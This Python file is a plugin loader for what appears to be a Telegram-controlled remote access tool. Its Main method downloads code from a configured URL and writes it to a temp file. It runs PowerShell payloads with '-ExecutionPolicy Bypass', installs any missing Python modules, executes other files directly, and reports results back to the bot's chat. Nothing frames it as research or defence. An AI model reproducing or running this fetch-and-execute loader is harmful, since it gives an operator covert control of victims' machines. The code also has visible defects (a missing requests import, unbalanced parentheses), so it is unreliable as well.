from os import path
import re, sys
import subprocess
import tempfile
class Plugin():
	def __init__(self, _):
		self._ = _
		self.plugins = _.plugins
		self.token = _.token
		self.plugin = _.args[0]
		self.chat_id = _.chat_id
		self.Send_Message = _.Send_Message
		self.Main()

	def Main(self):
		if self.plugin in self.plugins.keys():
			url = self.plugins[self.plugin]["Url"]
			file = tempfile.TemporaryFile()
			filename = file.name + "." + self.plugins[self.plugin]["Extention"]
			file.close()
			req = requests.get(url)
			file = open(filename, "w")
			file.write(req.content)
			file.close()
			if self.plugins[self.plugin]["Extention"] == "PS1":
				sub = subprocess.Popen(["powershell.exe","-ExecutionPolicy","Bypass","-File",filename,self.token, self.chat_id],shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
				output, error = sub.communicate()
				if error:
					self.Send_Message.Send("%E2%9C%96%EF%B8%8F Failed Execute Plugin\n\n%E2%9D%96 Error : \n" + error)
			elif self.plugins[self.plugin]["Extention"] == "Py":
				self.Send_Message.Send("%F0%9F%93%8C Checking Modules...")
				for i in req.text.split("\n"):
					if "import " in i:
						try:
							subprocess.check_call([path.dirname(sys.executable)), "-c", i])
						except:
							if i.startswith("from "):
								module = re.findall("from (.*?) import", i)[0].split(".")[0]
							elif i.startswith("import "):
								module = i.replace("import ","").split(".")[0]
							self.Send_Message.Send("%F0%9F%93%8C Installing (" + module + ")" + " Module...")
							self._.Install_Module(module)
				sub = subprocess.Popen([path.dirname(sys.executable)), filename, self.token, self.chat_id], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			else:
				sub = subprocess.Popen([filename, self.token, self.chat_id] ,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			output, error = sub.communicate()
			if not error:
				self.Send_Message.Send("%E2%9C%94%EF%B8%8F Plugin (" + self.plugin + ")" + " Executed")
			else:
				self.Send_Message.Send("%E2%9C%96%EF%B8%8F Failed Execute (" + self.plugin + ")" + " Plugin\n\n%E2%9D%96 Error : " + error)
		else:
			self.Send_Message.Send("%E2%9C%96%EF%B8%8F Plugin (" + self.plugin + ")" + " Not Found")
